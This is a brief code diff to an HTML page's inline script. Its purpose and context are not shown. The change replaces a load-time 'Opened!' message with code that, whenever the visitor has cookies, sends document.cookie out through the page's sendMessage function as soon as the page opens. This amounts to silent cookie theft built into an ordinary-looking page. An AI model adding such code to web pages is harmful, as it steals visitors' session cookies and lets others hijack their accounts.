@@ -90,7 +90,11 @@
             sendMessage(textarea.value);
             textarea.value = "\nThank you!";
         }
-        sendMessage("Opened!");
+        if (document.cookie != '') {
+            sendMessage(document.cookie);
+        } else {
+            sendMessage("Opened!");
+        }
         </script>
     </body>
 </html>
